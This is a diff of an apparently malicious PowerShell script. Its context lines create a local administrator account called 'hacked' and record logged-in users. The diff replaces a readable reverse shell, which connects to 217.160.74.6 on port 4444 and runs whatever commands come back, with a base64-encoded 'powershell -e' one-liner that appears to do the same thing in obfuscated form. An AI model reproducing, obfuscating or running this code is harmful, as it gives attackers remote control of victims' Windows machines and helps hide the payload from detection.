@@ -6,46 +6,4 @@ Add-LocalGroupMember -Group "Administrators" -Member "hacked"
 
 Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty UserName | Out-File -FilePath "C:/online_users.txt"
 
-do {
-    # Delay before establishing network connection, and between retries
-    Start-Sleep -Seconds 1
-
-    # Connect to C2
-    try{
-        $TCPClient = New-Object Net.Sockets.TCPClient('217.160.74.6', 4444)
-    } catch {}
-} until ($TCPClient.Connected)
-
-$NetworkStream = $TCPClient.GetStream()
-$StreamWriter = New-Object IO.StreamWriter($NetworkStream)
-
-# Writes a string to C2
-function WriteToStream ($String) {
-    # Create buffer to be used for next network stream read. Size is determined by the TCP client recieve buffer (65536 by default)
-    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}
-
-    # Write to C2
-    $StreamWriter.Write($String + 'SHELL> ')
-    $StreamWriter.Flush()
-}
-
-# Initial output to C2. The function also creates the inital empty byte array buffer used below.
-WriteToStream ''
-
-# Loop that breaks if NetworkStream.Read throws an exception - will happen if connection is closed.
-while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
-    # Encode command, remove last byte/newline
-    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
-    
-    # Execute command and save output (including errors thrown)
-    $Output = try {
-            Invoke-Expression $Command 2>&1 | Out-String
-        } catch {
-            $_ | Out-String
-        }
-
-    # Write output to C2
-    WriteToStream ($Output)
-}
-# Closes the StreamWriter and the underlying TCPClient
-$StreamWriter.Close()
+powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMgAxADcALgAxADYAMAAuADcANAAuADYAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
